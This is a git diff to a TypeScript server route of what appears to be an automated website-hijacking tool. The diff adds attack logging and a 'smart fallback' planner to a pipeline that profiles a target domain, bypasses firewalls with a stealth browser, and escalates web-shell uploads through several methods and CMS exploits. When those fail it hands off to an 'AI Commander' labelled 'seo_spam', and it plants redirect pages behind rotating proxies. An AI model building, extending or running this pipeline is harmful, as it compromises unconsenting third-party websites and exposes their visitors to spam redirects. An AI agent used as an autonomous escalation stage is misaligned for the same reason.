@@ -25,6 +25,8 @@ import { eq } from "drizzle-orm";
 import { getDeployLearnings } from "./ai-learning";
 import { runAiCommander, type AiCommanderResult, type AiCommanderEvent } from "./ai-autonomous-engine";
 import { runNonWpExploits, type NonWpScanResult } from "./non-wp-exploits";
+import { createAttackLogger, type AttackLogger } from "./attack-logger";
+import { buildTargetProfile, shouldSkipUploads, generateFallbackPlan, getOptimalRetryCount, formatFallbackPlan, type TargetProfile, type FallbackPlan } from "./smart-fallback";
 
 function parseSeoKeywords(input: unknown): string[] {
   if (!input) return [];
@@ -320,6 +322,37 @@ export function registerOneClickSSE(app: Express) {
     let aiTargetAnalysisResult: AiTargetAnalysis | null = null;
     let aiCommanderResult: AiCommanderResult | null = null;
 
+    // ─── Attack Logger: Capture every event for log viewer ───
+    const attackLogger = createAttackLogger(deployRecordId, user.id, targetDomain);
+    
+    // Wrap sendEvent to also log every event
+    const originalSendEvent = sendEvent;
+    function sendEventWithLog(event: ProgressEvent) {
+      originalSendEvent(event);
+      // Convert SSE ProgressEvent to PipelineEvent format for logger
+      attackLogger.log({
+        phase: (event as any).type === "ai_analysis" ? "ai_analysis" 
+          : (event as any).type === "ai_commander" ? "shellless"
+          : (event.step?.startsWith("pre_screening") ? "prescreen"
+          : event.step?.startsWith("stealth") ? "waf_bypass"
+          : event.step?.startsWith("alt_") ? "alt_upload"
+          : event.step?.startsWith("enhanced_") ? "upload"
+          : event.step?.startsWith("nonwp_") ? "indirect"
+          : event.step?.startsWith("ai_cmd") ? "shellless"
+          : event.step?.startsWith("ai_") ? "ai_analysis"
+          : "upload") as any,
+        step: event.step || "unknown",
+        detail: event.detail || "",
+        progress: (event as any).progress || 0,
+        data: (event as any).data,
+      }).catch(() => { /* non-blocking */ });
+    }
+
+    // Smart Fallback state
+    let targetProfile: TargetProfile | null = null;
+    let fallbackPlan: FallbackPlan | null = null;
+    const failedMethods: string[] = [];
+
     // ═══════════════════════════════════════════════
     //  MAIN PIPELINE — wrapped in a master try/catch
     //  that GUARANTEES a done or error event is sent
@@ -328,7 +361,7 @@ export function registerOneClickSSE(app: Express) {
       // ═══ PHASE 0: AI Target Deep Analysis ═══
       // Runs 8 intelligence-gathering steps before any attack
       if (enableAiAnalysis !== false) {
-        sendEvent({
+        sendEventWithLog({
           type: "step_detail",
           step: "ai_analysis",
           status: "running",
@@ -339,7 +372,7 @@ export function registerOneClickSSE(app: Express) {
             targetDomain,
             (step: AnalysisStep) => {
               // Stream each analysis step to frontend
-              sendEvent({
+              sendEventWithLog({
                 type: "ai_analysis",
                 step: `ai_deep_${step.stepId}`,
                 status: step.status === "complete" ? "done" : step.status === "error" ? "warning" : "running",
@@ -358,7 +391,7 @@ export function registerOneClickSSE(app: Express) {
 
           // Send final AI analysis summary
           const strategy = aiTargetAnalysisResult.aiStrategy;
-          sendEvent({
+          sendEventWithLog({
             type: "ai_analysis",
             step: "ai_analysis_complete",
             status: strategy.shouldProceed ? "done" : "warning",
@@ -386,7 +419,7 @@ export function registerOneClickSSE(app: Express) {
 
           // Log tactical analysis
           if (strategy.tacticalAnalysis) {
-            sendEvent({
+            sendEventWithLog({
               type: "step_detail",
               step: "ai_tactical",
               status: "done",
@@ -396,7 +429,7 @@ export function registerOneClickSSE(app: Express) {
 
           // Log best approach
           if (strategy.bestApproach) {
-            sendEvent({
+            sendEventWithLog({
               type: "step_detail",
               step: "ai_approach",
               status: "done",
@@ -406,7 +439,7 @@ export function registerOneClickSSE(app: Express) {
 
           // Log warnings
           if (strategy.warnings.length > 0) {
-            sendEvent({
+            sendEventWithLog({
               type: "step_detail",
               step: "ai_warnings",
               status: "warning",
@@ -415,7 +448,7 @@ export function registerOneClickSSE(app: Express) {
           }
         } catch (e: any) {
           console.error("[AI Analysis] Error:", e.message);
-          sendEvent({
+          sendEventWithLog({
             type: "step_detail",
             step: "ai_analysis",
             status: "warning",
@@ -428,7 +461,7 @@ export function registerOneClickSSE(app: Express) {
       try {
         const learnings = await getDeployLearnings(targetDomain);
         if (learnings && learnings.totalPastDeploys > 0) {
-          sendEvent({
+          sendEventWithLog({
             type: "ai_analysis",
             step: "ai_learning",
             status: "done",
@@ -451,7 +484,7 @@ export function registerOneClickSSE(app: Express) {
 
       // ─── Pre-Screening Phase ───
       if (enablePreScreening !== false) {
-        sendEvent({
+        sendEventWithLog({
           type: "step_detail",
           step: "pre_screening",
           status: "running",
@@ -459,7 +492,7 @@ export function registerOneClickSSE(app: Express) {
         });
         try {
           preScreenResult = await preScreenTarget(targetDomain);
-          sendEvent({
+          sendEventWithLog({
             type: "ai_analysis",
             step: "pre_screening",
             status: preScreenResult.overallSuccessProbability >= 30 ? "running" : "warning",
@@ -479,7 +512,7 @@ export function registerOneClickSSE(app: Express) {
           });
 
           if (preScreenResult.overallSuccessProbability < 15) {
-            sendEvent({
+            sendEventWithLog({
               type: "step_detail",
               step: "pre_screening",
               status: "warning",
@@ -487,7 +520,7 @@ export function registerOneClickSSE(app: Express) {
             });
           }
         } catch (e: any) {
-          sendEvent({
+          sendEventWithLog({
             type: "step_detail",
             step: "pre_screening",
             status: "warning",
@@ -496,12 +529,52 @@ export function registerOneClickSSE(app: Express) {
         }
       }
 
+      // ═══ SMART FALLBACK: Build target profile & generate attack plan ═══
+      try {
+        targetProfile = buildTargetProfile(targetDomain, preScreenResult, aiTargetAnalysisResult);
+        fallbackPlan = generateFallbackPlan(targetProfile, attackLogger, 600, failedMethods);
+
+        sendEventWithLog({
+          type: "step_detail",
+          step: "smart_fallback_plan",
+          status: "done",
+          detail: `🧠 Smart Fallback Plan: ${fallbackPlan.strategy} — ${fallbackPlan.methods.length} methods queued, ${fallbackPlan.skipMethods.length} skipped`,
+          data: {
+            strategy: fallbackPlan.strategy,
+            methodCount: fallbackPlan.methods.length,
+            skipCount: fallbackPlan.skipMethods.length,
+            topMethods: fallbackPlan.methods.slice(0, 5).map(m => ({
+              name: m.method.name,
+              successRate: m.estimatedSuccessRate,
+              timeBudget: m.timeBudget,
+            })),
+            skippedMethods: fallbackPlan.skipMethods,
+            shouldSkipUploads: shouldSkipUploads(targetProfile),
+            optimalRetries: getOptimalRetryCount(targetProfile, maxRetries ?? 3),
+          },
+        });
+
+        // Check if uploads should be skipped entirely
+        const uploadDecision = shouldSkipUploads(targetProfile);
+        if (uploadDecision.skip) {
+          sendEventWithLog({
+            type: "step_detail",
+            step: "smart_skip_uploads",
+            status: "warning",
+            detail: `⚡ Smart Fallback: ${uploadDecision.reason}`,
+          });
+        }
+      } catch (e: any) {
+        console.error("[Smart Fallback] Error building plan:", e.message);
+        // Non-critical — continue without smart fallback
+      }
+
       // ─── WAF Bypass via Stealth Browser ───
       let stealthCookies = "";
       const browserAvailable = isBrowserAvailable();
       if (enableStealthBrowser !== false && preScreenResult?.wafDetected && browserAvailable) {
         stealthBrowserUsed = true;
-        sendEvent({
+        sendEventWithLog({
           type: "step_detail",
           step: "stealth_waf_bypass",
           status: "running",
@@ -510,7 +583,7 @@ export function registerOneClickSSE(app: Express) {
         try {
           const wafResult = await stealthBypassWaf(`https://${targetDomain}`);
           stealthCookies = wafResult.cookies;
-          sendEvent({
+          sendEventWithLog({
             type: "step_detail",
             step: "stealth_waf_bypass",
             status: wafResult.success ? "done" : "warning",
@@ -519,7 +592,7 @@ export function registerOneClickSSE(app: Express) {
               : `⚠️ WAF bypass: ${wafResult.details}`,
           });
         } catch (e: any) {
-          sendEvent({
+          sendEventWithLog({
             type: "step_detail",
             step: "stealth_waf_bypass",
             status: "warning",
@@ -530,7 +603,7 @@ export function registerOneClickSSE(app: Express) {
 
       // Send proxy info
       if (proxies.length > 0) {
-        sendEvent({
+        sendEventWithLog({
           type: "step_detail",
           step: "proxy_config",
           status: "running",
@@ -539,13 +612,23 @@ export function registerOneClickSSE(app: Express) {
         });
       }
 
-      // ─── Main Deploy ───
+      // ─── Main Deploy (with Smart Fallback retry optimization) ───
+      const smartRetries = targetProfile 
+        ? getOptimalRetryCount(targetProfile, maxRetries ?? 3)
+        : Math.min(maxRetries ?? 3, 3);
+      
+      // Log pipeline start
+      attackLogger.logMessage("upload", "pipeline_start", 
+        `🚀 Pipeline เริ่มทำงาน — target: ${targetDomain}, retries: ${smartRetries}, methods: ${fallbackPlan?.methods.length || 'all'}`,
+        "info"
+      ).catch(() => {});
+
       const result = await oneClickDeploy(targetDomain, redirectUrl, {
-        maxRetries: Math.min(maxRetries ?? 3, 3),  // Cap at 3 retries to prevent timeout
+        maxRetries: smartRetries,  // Smart retry count based on success probability
         geoRedirectEnabled: geoRedirectEnabled ?? true,
         landingHtml: landingHtml,
         shellRecheckDelay: 5000,
-        onProgress: sendEvent,
+        onProgress: sendEventWithLog,
         proxies: proxies.length > 0 ? proxies : undefined,
         proxyRotation: proxyRotation || "random",
         weightedRedirects: weightedRedirects.length > 0 ? weightedRedirects : undefined,
@@ -559,10 +642,23 @@ export function registerOneClickSSE(app: Express) {
         methodPriority: Array.isArray(methodPriority) ? methodPriority : undefined,
       });
 
-      // ─── Alt Upload Methods Fallback ───
+      // ─── Alt Upload Methods Fallback (with Smart Fallback intelligence) ───
       const shellFailed = !result.shellInfo?.url;
-      if (shellFailed && enableAltMethods !== false) {
-        sendEvent({
+      
+      // Track failed method for smart fallback
+      if (shellFailed) {
+        failedMethods.push("standard_upload");
+        attackLogger.logMessage("upload", "standard_upload_failed",
+          `❌ Standard upload failed — adding to failed methods list, trying alternatives...`,
+          "warning"
+        ).catch(() => {});
+      }
+
+      // Smart Fallback: Check if we should skip alt upload methods entirely
+      const skipUploads = targetProfile ? shouldSkipUploads(targetProfile) : { skip: false, reason: "" };
+      
+      if (shellFailed && enableAltMethods !== false && !skipUploads.skip) {
+        sendEventWithLog({
           type: "step_detail",
           step: "alt_upload",
           status: "running",
@@ -580,7 +676,7 @@ export function registerOneClickSSE(app: Express) {
             altFileName,
             altPath,
             (method: string, status: string) => {
-              sendEvent({
+              sendEventWithLog({
                 type: "step_detail",
                 step: `alt_${method.replace(/\s+/g, "_").toLowerCase()}`,
                 status: "running",
@@ -591,7 +687,7 @@ export function registerOneClickSSE(app: Express) {
           const successResult = altResults.find(r => r.success);
           if (successResult) {
             altMethodUsed = successResult.method;
-            sendEvent({
+            sendEventWithLog({
               type: "step_detail",
               step: "alt_upload",
               status: "done",
@@ -610,8 +706,9 @@ export function registerOneClickSSE(app: Express) {
               result.summary.successSteps = (result.summary.successSteps || 0) + 1;
             }
           } else {
+            failedMethods.push("alt_upload");
             const failDetails = altResults.map(r => `${r.method}: ${r.details}`).join("; ");
-            sendEvent({
+            sendEventWithLog({
               type: "step_detail",
               step: "alt_upload",
               status: "warning",
@@ -619,7 +716,7 @@ export function registerOneClickSSE(app: Express) {
             });
           }
         } catch (e: any) {
-          sendEvent({
+          sendEventWithLog({
             type: "step_detail",
             step: "alt_upload",
             status: "warning",
@@ -630,7 +727,7 @@ export function registerOneClickSSE(app: Express) {
         // ═══ ENHANCED PARALLEL UPLOAD — Final Escalation ═══
         // If alt methods also failed, use the enhanced multi-vector parallel upload engine
         if (!altMethodUsed) {
-          sendEvent({
+          sendEventWithLog({
             type: "step_detail",
             step: "enhanced_parallel",
             status: "running",
@@ -654,7 +751,7 @@ export function registerOneClickSSE(app: Express) {
               stealthCookies: stealthCookies || undefined,
               timeout: 15000,
               onMethodProgress: (method: string, status: string) => {
-                sendEvent({
+                sendEventWithLog({
                   type: "step_detail",
                   step: `enhanced_${method.replace(/\s+/g, "_").toLowerCase()}`,
                   status: "running",
@@ -668,7 +765,7 @@ export function registerOneClickSSE(app: Express) {
 
             if (enhancedResult.success && enhancedResult.bestResult) {
               altMethodUsed = `enhanced_${enhancedResult.bestResult.method}`;
-              sendEvent({
+              sendEventWithLog({
                 type: "step_detail",
                 step: "enhanced_parallel",
                 status: "done",
@@ -696,16 +793,32 @@ export function registerOneClickSSE(app: Express) {
                 result.summary.totalFilesDeployed = (result.summary.totalFilesDeployed || 0) + 1;
               }
             } else {
+              failedMethods.push("enhanced_parallel");
               const methodsSummary = Array.from(new Set(enhancedResult.allResults.map(r => r.method))).join(", ");
-              sendEvent({
+              sendEventWithLog({
                 type: "step_detail",
                 step: "enhanced_parallel",
                 status: "warning",
                 detail: `⚠️ Enhanced Parallel Upload exhausted (${enhancedResult.rounds} rounds, ${enhancedResult.allResults.length} attempts). Methods tried: ${methodsSummary}`,
               });
+
+              // Re-generate fallback plan with updated failure info
+              if (targetProfile) {
+                fallbackPlan = generateFallbackPlan(targetProfile, attackLogger, 600, failedMethods);
+                sendEventWithLog({
+                  type: "step_detail",
+                  step: "smart_replan",
+                  status: "running",
+                  detail: `🧠 Smart Fallback Re-plan: ${fallbackPlan.methods.length} methods remaining — ${fallbackPlan.strategy}`,
+                  data: { 
+                    remainingMethods: fallbackPlan.methods.slice(0, 5).map(m => m.method.name),
+                    failedSoFar: failedMethods,
+                  },
+                });
+              }
             }
           } catch (e: any) {
-            sendEvent({
+            sendEventWithLog({
               type: "step_detail",
               step: "enhanced_parallel",
               status: "warning",
@@ -715,6 +828,17 @@ export function registerOneClickSSE(app: Express) {
         }
       }
 
+      // Smart Fallback: If uploads were skipped, log and escalate directly
+      if (skipUploads.skip && shellFailed) {
+        sendEventWithLog({
+          type: "step_detail",
+          step: "smart_escalate",
+          status: "running",
+          detail: `⚡ Smart Fallback: Upload methods skipped — escalating directly to exploit/shellless/AI Commander`,
+        });
+        failedMethods.push("standard_upload", "alt_upload", "enhanced_parallel");
+      }
+
       // ═══ NON-WP CMS EXPLOITS — Targeted exploits for non-WordPress CMS ═══
       const allUploadsFailed = !result.shellInfo?.url && !altMethodUsed;
       const sseDetectedCms = (preScreenResult?.cms || aiTargetAnalysisResult?.techStack?.cms || "").toLowerCase();
@@ -722,7 +846,7 @@ export function registerOneClickSSE(app: Express) {
       const sseIsGeneric = !sseDetectedCms || sseDetectedCms === "unknown";
 
       if (allUploadsFailed && (sseIsNonWp || sseIsGeneric)) {
-        sendEvent({
+        sendEventWithLog({
           type: "step_detail",
           step: "nonwp_exploits",
           status: "running",
@@ -735,7 +859,7 @@ export function registerOneClickSSE(app: Express) {
             cms: sseDetectedCms || "unknown",
             timeout: 15000,
             onProgress: (method, detail) => {
-              sendEvent({
+              sendEventWithLog({
                 type: "step_detail",
                 step: `nonwp_${method}`,
                 status: "running",
@@ -751,7 +875,7 @@ export function registerOneClickSSE(app: Express) {
           if (successfulUploads.length > 0) {
             const bestExploit = successfulUploads[0];
             altMethodUsed = `nonwp_${bestExploit.method}`;
-            sendEvent({
+            sendEventWithLog({
               type: "step_detail",
               step: "nonwp_exploits",
               status: "done",
@@ -773,7 +897,7 @@ export function registerOneClickSSE(app: Express) {
             result.summary.successSteps = (result.summary.successSteps || 0) + 1;
           } else {
             const findings = nonWpResult.results.filter(r => r.success);
-            sendEvent({
+            sendEventWithLog({
               type: "step_detail",
               step: "nonwp_exploits",
               status: findings.length > 0 ? "warning" : "done",
@@ -781,7 +905,7 @@ export function registerOneClickSSE(app: Express) {
             });
           }
         } catch (e: any) {
-          sendEvent({
+          sendEventWithLog({
             type: "step_detail",
             step: "nonwp_exploits",
             status: "warning",
@@ -794,7 +918,7 @@ export function registerOneClickSSE(app: Express) {
       // Activates when all previous methods failed AND enableAiCommander is on
       const aiCommanderNeeded = !result.shellInfo?.url && !altMethodUsed;
       if (aiCommanderNeeded && enableAiCommander !== false) {
-        sendEvent({
+        sendEventWithLog({
           type: "step_detail",
           step: "ai_commander",
           status: "running",
@@ -813,7 +937,7 @@ export function registerOneClickSSE(app: Express) {
             pipelineType: "seo_spam",
             sessionId: deployRecordId ? String(deployRecordId) : undefined,
             onEvent: (event: AiCommanderEvent) => {
-              sendEvent({
+              sendEventWithLog({
                 type: "ai_commander" as any,
                 step: `ai_cmd_${event.type}_${event.iteration}`,
                 status: event.type === "success" ? "done" : event.type === "exhausted" ? "warning" : "running",
@@ -830,7 +954,7 @@ export function registerOneClickSSE(app: Express) {
 
           if (aiCommanderResult.success && aiCommanderResult.uploadedUrl) {
             altMethodUsed = `ai_commander_${aiCommanderResult.successfulMethod}`;
-            sendEvent({
+            sendEventWithLog({
               type: "step_detail",
               step: "ai_commander",
               status: "done",
@@ -856,7 +980,7 @@ export function registerOneClickSSE(app: Express) {
             result.summary.successSteps = (result.summary.successSteps || 0) + 1;
             result.summary.totalFilesDeployed = (result.summary.totalFilesDeployed || 0) + 1;
           } else {
-            sendEvent({
+            sendEventWithLog({
               type: "step_detail",
               step: "ai_commander",
               status: "warning",
@@ -869,7 +993,7 @@ export function registerOneClickSSE(app: Express) {
             });
           }
         } catch (e: any) {
-          sendEvent({
+          sendEventWithLog({
             type: "step_detail",
             step: "ai_commander",
             status: "warning",
@@ -887,7 +1011,7 @@ export function registerOneClickSSE(app: Express) {
           .slice(0, 5);
 
         if (verifyUrls.length > 0) {
-          sendEvent({
+          sendEventWithLog({
             type: "step_detail",
             step: "stealth_verify",
             status: "running",
@@ -895,7 +1019,7 @@ export function registerOneClickSSE(app: Express) {
           });
           try {
             const verifyResults = await stealthVerifyBatch(verifyUrls, (url, vResult) => {
-              sendEvent({
+              sendEventWithLog({
                 type: "step_detail",
                 step: "stealth_verify",
                 status: vResult.exists ? "done" : "warning",
@@ -904,7 +1028,7 @@ export function registerOneClickSSE(app: Express) {
             });
             const verified = verifyResults.filter(r => r.exists);
             const redirecting = verifyResults.filter(r => r.hasRedirectCode);
-            sendEvent({
+            sendEventWithLog({
               type: "step_detail",
               step: "stealth_verify",
               status: verified.length > 0 ? "done" : "warning",
@@ -918,7 +1042,7 @@ export function registerOneClickSSE(app: Express) {
               details: verifyResults,
             };
           } catch (e: any) {
-            sendEvent({
+            sendEventWithLog({
               type: "step_detail",
               step: "stealth_verify",
               status: "warning",
@@ -932,7 +1056,7 @@ export function registerOneClickSSE(app: Express) {
 
       // Notify if stealth browser was requested but not available
       if (enableStealthBrowser !== false && !browserAvailable && preScreenResult?.wafDetected) {
-        sendEvent({
+        sendEventWithLog({
           type: "step_detail",
           step: "stealth_browser",
           status: "warning",
@@ -955,13 +1079,21 @@ export function registerOneClickSSE(app: Express) {
       });
 
       if (deployRecordId) {
-        sendEvent({
+        sendEventWithLog({
           type: "step_detail",
           step: "auto_log",
           status: "done",
           detail: `📋 Deploy #${deployRecordId} saved — ${deployStatus.toUpperCase()}`,
         });
       }
+
+      // ═══ Log pipeline completion ═══
+      const duration = ((Date.now() - pipelineStartTime) / 1000).toFixed(1);
+      attackLogger.logMessage("complete", deployStatus === "success" ? "success" : deployStatus === "partial" ? "partial" : "failed",
+        `Pipeline ${deployStatus.toUpperCase()} — ${duration}s, failed methods: [${failedMethods.join(", ")}]`,
+        deployStatus === "success" ? "success" : deployStatus === "partial" ? "warning" : "error",
+        { deployStatus, duration, failedMethods, altMethodUsed, stealthBrowserUsed }
+      ).catch(() => {});
 
       // ═══ SEND FINAL RESULT — GUARANTEED ═══
       cleanup();
@@ -985,6 +1117,13 @@ export function registerOneClickSSE(app: Express) {
     } catch (error: any) {
       // ─── Pipeline-level error — GUARANTEED to send error event ───
       console.error("[Pipeline] Fatal error:", error.message || error);
+
+      // Log fatal error
+      attackLogger.logMessage("error", "pipeline_fatal",
+        `❌ Pipeline fatal error: ${error.message || "Unknown error"}`,
+        "critical",
+        { error: error.message, failedMethods }
+      ).catch(() => {});
 
       // Safe update — never throws
       await safeUpdateDeployRecord(deployRecordId, {
